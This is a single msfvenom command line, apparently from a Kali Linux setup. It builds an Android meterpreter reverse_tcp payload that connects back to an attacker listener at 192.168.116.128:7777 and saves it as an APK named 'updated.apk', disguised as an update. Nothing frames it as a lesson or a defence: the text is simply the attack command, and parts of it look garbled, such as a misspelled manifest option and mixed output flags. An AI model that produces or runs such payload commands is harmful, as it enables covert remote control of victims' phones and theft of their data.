msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.116.128 
lport=7777 \ --platform android --arch dalvik \ AndroidMainfest.targetSdkVersion=31 \ 
-o updated.apk R > /home/kali/attack.apk
